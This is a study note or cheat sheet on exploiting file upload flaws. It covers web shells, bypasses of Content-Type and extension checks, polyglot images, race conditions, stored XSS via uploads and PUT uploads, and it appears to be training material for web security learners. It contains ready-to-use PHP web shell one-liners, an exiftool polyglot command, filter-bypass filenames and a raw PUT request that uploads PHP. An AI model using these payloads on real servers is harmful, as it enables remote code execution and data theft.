# 1. Exploiting unrestricted file uploads to deploy a web shell

When the webside has unrestricted file uploads, by uploading server-side scripts (PHP, Java, Python) to a website configured to execute them creates a critical security vulnerability. A successful web shell upload grants attackers:

- Full server control
- Ability to read/write arbitrary files
- Access to sensitive data
- Capability to pivot attacks against internal and external systems

For example, a simple PHP one-liner (`<?php echo file_get_contents('/path/to/target/file'); ?>`) can extract sensitive files when requested through the browser.

A more versatile web shell may look something like this:

`<?php echo system($_GET['command']); ?>`

This script enables you to pass an arbitrary system command via a query parameter as follows:

`GET /example/exploit.php?command=id HTTP/1.1`

Example: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`. Upload it, then find the location of your uploaded shell to gain RCE: `http://website/shell-location?cmd=id`

# 2. Exploiting flawed validation of file uploads

## 2.1 - Flawed file type validation

When uploading files through HTML forms, `multipart/form-data` is used (rather than `application/x-www-form-url-encoded`) to efficiently handle binary data like images or PDFs.

In multipart requests, each form input creates a separate section containing:
- `Content-Disposition` header with field information
- Optional `Content-Type` header specifying the MIME type

Security issue: Servers may validate uploads by checking only the `Content-Type` header (e.g., permitting only `image/jpeg`), without verifying the actual file contents. This validation can be easily bypassed using tools like Burp Repeater to manipulate the Content-Type value, allowing malicious files to be uploaded despite content type restrictions.

**Note:**
> - In this case, use intercept the upload request with tools like Burp.
> - Change the `Content-type` header value to `image/jpeg` or whatever that get accepted

## 2.2 - Preventing file execution in user-accessible directories

To defend against web shells that bypass upload filters, servers implement a second security layer: preventing script execution in user-accessible directories.

Key points:
- Servers typically only execute files with explicitly configured MIME types
- Unconfigured script types may be served as plain text or return errors
- This prevents uploaded malicious scripts from executing
- Directory configurations vary in strictness
- User upload directories usually have stricter execution controls
- Scripts uploaded to directories not intended for user files may still execute

When scripts are served as text rather than executed, this may leak source code but prevents web shell functionality.

## 2.3 - Insufficient blacklisting of dangerous file types

Attempting to prevent malicious script uploads by blacklisting dangerous file extensions (like `.php`) is fundamentally inadequate. This approach fails because:

- It's nearly impossible to block every potentially executable file extension
- Attackers can bypass protections using lesser-known but executable alternatives (`.php5`, `.shtml`, etc.)

This security weakness highlights why more comprehensive validation approaches are necessary beyond simple extension blacklisting.

### 2.3.1 - Overriding the server configuration

As mentioned, servers generally won’t execute files unless configured to do so. For example, to run PHP files, an Apache server may require these directives in `/etc/apache2/apache2.conf`:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

Many servers support directory-level configurations to override global settings. Apache uses `.htaccess` files, while IIS uses `web.config`. For instance, this IIS snippet allows serving JSON files:

```xml
<staticContent>
  <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

Although such configuration files aren’t usually accessible via HTTP, misconfigured servers might allow you to upload malicious ones. This can let attackers bypass extension filters by mapping custom extensions to executable MIME types.

### 2.3.2 - Obfuscating file extensions

Even strong blacklists can be bypassed through obfuscation techniques:

- **Case sensitivity issues**: If validation is case-sensitive but MIME type mapping isn't, files like `exploit.pHp` may bypass security checks.

- **Common bypass methods**:
  - Multiple extensions: `exploit.php.jpg`
  - Trailing characters: `exploit.php.`
  - URL encoding: `exploit%2Ephp`
  - Null byte injection: `exploit.asp;.jpg` or `exploit.asp%00.jpg` (also, try `exploit.php;.jpg` and `exploit.php%00.jpg`, work better.)
  - Multibyte unicode characters that convert to dots/nulls

- **Recursive stripping vulnerabilities**: If dangerous extensions are removed non-recursively, files like `exploit.p.phphp` become `exploit.php` after processing.

**Note:**
> - When using `null byte` like `exploit.php%00.jpg`, when you try access link of the shell to trigger, remember that the `.jpg` is gone.


## 2.4 - Flawed validation of the file's contents

More secure servers verify file contents rather than trusting the `Content-Type` header by:

- Checking intrinsic properties like image dimensions (PHP scripts have none)
- Verifying file signatures/fingerprints (e.g., JPEG files begin with `FF D8 FF`)

While more robust than extension checking, this approach remains vulnerable to polyglot files - such as JPEG images with malicious code embedded in their metadata using tools like ExifTool.

**Note:**
> - If the website check on the `signatures/fingerprints` of the file, use `ExifTool` to create a `polyglot PHP/JPG file` that is fundamentally a `normal image`, but contains your `PHP payload` in its metadata.
> - `exiftool -Comment='<?php system($_GET["cmd"]); ?>' images.jpg -o polyglot.php`
> - Upload and trigger RCE as normal.
> - In case its too messy, use this: `exiftool -Comment='<?php echo "START " . system($_GET["cmd"]) . " END"; ?>' <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`

## 2.5 - Exploiting file upload race conditions

Modern frameworks mitigate file upload risks by using temporary directories and randomized filenames, validating files before moving them to their final location. However, custom file upload handling—especially outside frameworks—can introduce race conditions.

For instance, some sites temporarily store uploaded files on the main filesystem and delete them if they fail validation, relying on antivirus scans. Even if the file exists for just milliseconds, an attacker may exploit that window to execute it.

These vulnerabilities are subtle and often hard to detect without access to source code.

> - Use request with `parallel` option.
> - Repeat request until the code is executed. (might take a while).
> - If not work, try burp extension `Turbo Intruder` or something similair.

### 2.5.1 - Race conditions in URL-based file uploads

When uploading files via URL, the server fetches the file over HTTP and stores it locally before validation. Since built-in framework protections may not apply, developers often implement custom (and potentially insecure) validation logic.

If files are stored in randomized temporary directories, exploitation is harder—unless predictable functions like `uniqid()` are used, which can be brute-forced. Attackers can increase their window by slowing the process, such as uploading large files with the payload at the start and padding afterward to delay validation.

# 3. Exploiting file upload vulnerabilities without remote code execution

## 3.1 - Uploading Malicious Client-Side Scripts

Even if server-side execution isn’t possible, you may upload files (e.g., HTML or SVG) containing `<script>` tags to trigger stored XSS. If the file is later viewed by others, their browsers will execute the script. However, this only works if the file is served from the same origin due to same-origin policy restrictions.

## 3.2 - Exploiting File Parsing Vulnerabilities

If uploads are securely stored and served, attackers may target vulnerabilities in how files are parsed. For example, XML-based formats like `.doc` or `.xls` may expose the server to XXE injection if not properly handled.

# 4. Uploading files using PUT

It's worth noting that some web servers may be configured to support PUT requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

**Note:** You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.
